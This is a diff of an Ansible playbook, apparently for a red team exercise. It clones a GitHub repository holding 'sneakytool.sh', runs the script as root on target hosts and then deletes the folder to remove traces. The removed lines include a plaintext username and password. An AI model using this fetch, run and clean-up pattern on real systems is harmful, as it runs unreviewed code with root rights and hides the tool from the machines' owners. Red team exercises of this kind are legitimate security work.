@@ -1,30 +1,27 @@
 ---
-- name: Copy, run, and cleanup tool on target machines
+- name: clone, run, and cleanup red team tool
   hosts: tool
-  #gather_facts: false
   become: yes
-  vars:
-    ansible_user: "jcw2555"
-    ansible_password: "Password!"
-    source_file: "~/redteamtool/sneakytool.sh"  
-    destination_dir: "/home/tool" 
-
   tasks:
-    - name: Ensure destination directory exists
-      ansible.builtin.file:
-        path: "{{ destination_dir }}"
-        state: directory
-        mode: '0755'
 
-    - name: Copy files from host to target machines
-      ansible.builtin.copy:
-        src: "{{ source_file }}"
-        dest: "{{ destination_dir }}"
-        owner: root
-        group: root
-        mode: '0644'
+# Update Apt package index
+  - name: Update apt package index
+    apt: 
+      update_cache: yes
 
-Change the permissions of the tool
+# Install Git
+  - name: Install Git
+    apt:
+      name: git
+      state: present
+
+# Reach out to github and download the repo with my red team tool
+  - name: Clone git with red team tool
+    ansible.builtin.git:
+      repo: https://github.com/jcw2555/redteamtool.git
+      dest: /home/tool
+
+# Change the permissions of the tool
   - name: Modify file permissions
     file:
       path: /home/tool/sneakytool.sh
@@ -47,12 +44,12 @@ Change the permissions of the tool
       line: 'UsePAM yes'
       state: present
 
-# # Run the bash script found in the github repository
+# Run the bash script found in the github repository
   - name: Execute script
     command: sh /home/tool/sneakytool.sh
 
 # Delete the github folder and all its contents
-  - name: Delete folder with tool
+  - name: Delete github folder
     file:
       path: /home/tool
       state: absent
